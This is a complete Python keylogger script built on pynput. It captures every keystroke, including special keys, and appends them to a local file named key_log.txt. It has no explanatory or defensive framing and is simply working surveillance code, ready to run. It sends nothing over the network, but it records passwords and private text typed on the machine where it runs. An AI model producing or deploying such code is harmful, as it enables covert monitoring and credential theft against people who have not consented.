from pynput.keyboard import Listener

# Path to the file where keystrokes will be logged
log_file = "key_log.txt"

# Function to handle each key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(' ')
            elif key == key.enter:
                f.write('\n')
            else:
                f.write(f' [{str(key)}] ')

# Function to start the listener
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
